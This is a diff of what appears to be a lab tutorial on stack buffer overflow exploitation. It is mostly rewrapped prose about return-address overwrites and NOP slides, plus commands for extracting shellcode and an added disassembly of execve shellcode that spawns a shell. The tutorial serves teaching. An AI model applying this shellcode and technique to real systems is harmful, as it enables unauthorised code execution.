@@ -1071,10 +1071,14 @@ Ditto for the markers.  You can touch it up if you wish.
 Using this approach on the original problem where we are doing a strcpy.
 ----------------------------------------------------------------------------
 
-The example code uses a smaller buffer, so my first worry is that the code will not fit in the buffer.  However, we could use aleph ones approach where we copy our shell code into the users environment and have our shell code access that.  However, I'm going to just adjust based upon the stack to pad until we find
-the return address and exploit it like the secret function demo.
+The example code uses a smaller buffer, so my first worry is that the code will
+not fit in the buffer.  However, we could use aleph ones approach where we copy
+our shell code into the users environment and have our shell code access that.
+However, I'm going to just adjust based upon the stack to pad until we find the
+return address and exploit it like the secret function demo.
 
-First thing to do is copy the buffer and strip off the leading parts for the model used by the testy1.c program.
+First thing to do is copy the buffer and strip off the leading parts for the
+model used by the testy1.c program.
 
 
 
@@ -1082,7 +1086,8 @@ First thing to do is copy the buffer and strip off the leading parts for the mod
 
 
 
-As expected this crashes since we have overwritten the return address.  (We only had 10 bytes of space for the shell code.  Well, no worries we patch it.
+As expected this crashes since we have overwritten the return address.  (We
+only had 10 bytes of space for the shell code.  Well, no worries we patch it.
 
 (gdb) step
 vulnerable (
@@ -1205,7 +1210,8 @@ dmesg shows
 
 
 Not unexpected.  When run under gdb control the ip address could be different.
-However, we are not stopped yet.  In previous days, you would get a coredump file in the directory when this happened however, now you don't.  So, do this
+However, we are not stopped yet.  In previous days, you would get a coredump
+file in the directory when this happened however, now you don't.  So, do this
 
 [davis@vm-i386 progs]$ coredumpctl gdb
 
@@ -1270,9 +1276,9 @@ sh-4.3$
 
 
 
-Now for the easiest shell of all.  This uses buffer_overflow2.c which has a buffer big
-enough that out entire shell code will fit in the read buffer.  I've already added
-nops for a landing spot so we can "nop slide" to our code.
+Now for the easiest shell of all.  This uses buffer_overflow2.c which has a
+buffer big enough that out entire shell code will fit in the read buffer.  I've
+already added nops for a landing spot so we can "nop slide" to our code.
 
 $ make buffer_overflow2
 $ make testya5.asm
@@ -1280,10 +1286,11 @@ $ hexdump -s 0x110 -v -e'/1 "Yx%02x"' testya5.o  > foo.txt
 $ sed -i 's/Y/\\/g'  foo.txt
 
 Once again just pulling out the portion until the first null.  This means that
-the buffer in the c program is 50 bytes and our shell code is 44 bytes.  The stack
-will have enough space for our shell code.  This means we will not land in the middle
-of our code, but this will not overflow the buffer.  We need to prepend enough nops so 
-that it pushes a nop slide into position for the return address to be overwritten.
+the buffer in the c program is 50 bytes and our shell code is 44 bytes.  The
+stack will have enough space for our shell code.  This means we will not land
+in the middle of our code, but this will not overflow the buffer.  We need to
+prepend enough nops so that it pushes a nop slide into position for the return
+address to be overwritten.
 
 Use this script to determine the number of nops.
 
@@ -1374,5 +1381,23 @@ foo.o               outfile.txt  simpleprog  testya1.asm   testya5.asm
 sh-4.3$ 
 
 
+
+##############
+Dump of assembler code from 0xbffff8a4 to 0xbffff8c2:
+   0xbffff8a4:  jmp    0xbffff8c3
+   0xbffff8a6:  pop    %esp
+   0xbffff8a7:  mov    %esp,%ebx
+   0xbffff8a9:  add    $0x8,%esp
+   0xbffff8ac:  mov    %ebx,(%esp)
+   0xbffff8af:  mov    %esp,%ecx
+   0xbffff8b1:  mov    %ecx,%eax
+   0xbffff8b3:  add    $0x4,%eax
+   0xbffff8b6:  xor    %edx,%edx
+   0xbffff8b8:  mov    %edx,(%eax)
+   0xbffff8ba:  xor    %eax,%eax
+   0xbffff8bc:  mov    %eax,%edx
+   0xbffff8be:  add    $0xb,%eax
+   0xbffff8c1:  int    $0x80
+End of assembler dump.
 
 
